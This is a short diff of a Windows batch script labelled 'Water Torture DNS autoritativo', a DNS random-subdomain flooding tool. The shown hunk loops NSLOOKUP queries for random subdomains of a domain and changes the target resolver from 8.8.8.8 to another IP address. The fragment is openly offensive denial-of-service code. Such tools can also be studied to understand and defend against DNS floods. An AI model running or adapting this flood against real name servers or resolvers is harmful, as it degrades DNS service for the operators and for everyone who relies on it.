@@ -11,7 +11,7 @@ ECHO Water Torture DNS autoritativo. (c) hackingyseguridad 2016. Version 1.
 
 SET/A ran=%random%
 
-NSLOOKUP %ran%.hackingyseguridad.es 8.8.8.8
+NSLOOKUP %ran%.hackingyseguridad.es 196.200.104.106
 
 goto loop
 
